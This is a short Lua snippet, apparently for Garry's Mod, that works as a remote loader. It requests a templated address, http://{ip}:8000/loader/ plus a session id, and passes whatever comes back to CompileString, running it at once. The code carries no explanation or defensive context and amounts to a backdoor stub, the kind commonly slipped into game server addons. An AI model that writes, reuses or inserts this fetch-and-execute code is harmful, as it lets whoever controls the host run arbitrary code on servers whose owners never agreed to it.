HTTP({
    url="http://{ip}:8000/loader/$sid",
    method="GET",
    success=function(c,b,h)
        if (c == 200) then
            CompileString(b,"[C]",false)()
        end
    end
})
